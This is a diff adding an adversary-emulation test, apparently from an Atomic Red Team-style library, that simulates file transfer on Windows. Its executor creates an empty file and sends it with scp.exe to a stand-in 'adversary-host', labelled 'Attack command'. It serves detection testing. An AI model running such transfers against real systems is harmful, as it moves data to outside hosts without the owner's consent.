@@ -1,0 +1,69 @@
+- name: Windows push file using scp.exe
+  description: |
+    This test simulates pushing files using SCP on a Windows environment.
+  supported_platforms:
+    - windows
+  input_arguments:
+    username:
+      type: string
+      default: adversary
+      description: User account to authenticate on remote host
+    file_name:
+      type: string
+      default: T1105.txt
+      description: Name of the file to transfer
+    local_path:
+      type: path
+      default: C:\temp
+      description: Local path to copy from
+    remote_host:
+      type: string
+      default: adversary-host
+      description: Remote host to send
+    remote_path:
+      type: path
+      default: /tmp/
+      description: Path of folder to copy
+  dependency_executor_name: powershell
+  dependencies:
+    - description: This test requires the `scp` command to be available on the system.
+      prereq_command: |
+        if (Get-Command scp -ErrorAction SilentlyContinue) {
+            Write-Output "SCP command is available."
+            exit 0
+        } else {
+            Write-Output "SCP command is not available."
+            exit 1
+        }
+      get_prereq_command: |
+        # Define the capability name for OpenSSH Client
+        $capabilityName = "OpenSSH.Client~~~~0.0.1.0"
+        try {
+            # Install the OpenSSH Client capability
+            Add-WindowsCapability -Online -Name $capabilityName -ErrorAction Stop
+            Write-Host "OpenSSH Client has been successfully installed." -ForegroundColor Green
+        } catch {
+            # Handle any errors that occur during the installation process
+            Write-Host "An error occurred while installing OpenSSH Client: $_" -ForegroundColor Red
+        }
+  executor:
+    command: |
+      # Check if the folder exists, create it if it doesn't
+      $folderPath = "#{local_path}"
+      if (-Not (Test-Path -Path $folderPath)) {
+        New-Item -Path $folderPath -ItemType Directory
+      }
+
+      # Create the file
+      $filePath = Join-Path -Path $folderPath -ChildPath "#{file_name}"
+      New-Item -Path $filePath -ItemType File -Force
+      Write-Output "File created: $filePath"
+
+      # Attack command
+      scp.exe #{local_path}\#{file_name} #{username}@#{remote_host}:#{remote_path}
+    cleanup_command: |
+      $filePath = Join-Path -Path "#{local_path}" -ChildPath "#{file_name}"
+      Remove-Item -Path $filePath -Force -erroraction silentlycontinue
+      Write-Output "File deleted: $filePath"
+    name: powershell
+    elevation_required: true
